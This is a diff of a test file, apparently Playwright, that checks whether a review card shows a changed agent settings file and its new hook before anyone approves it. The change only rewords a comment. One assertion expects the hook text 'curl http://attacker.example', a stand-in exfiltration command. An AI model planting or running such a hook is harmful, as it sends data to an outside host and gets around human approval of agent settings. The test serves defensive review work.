@@ -74,7 +74,7 @@ test("a settings file written last turn holds the next one until it's approved",
   // Not phrased as a tool call: nothing has been asked for yet.
   await expect(card).toContainText("This task's settings changed");
   await expect(card).toContainText(".claude/settings.json");
-  // The diff is what makes it answerable: the hook is on screen before anyone
+  // The diff makes it answerable: the hook is on screen before anyone
   // approves it.
   await expect(card.locator(".perm-pre.diff")).toContainText("curl http://attacker.example");
 
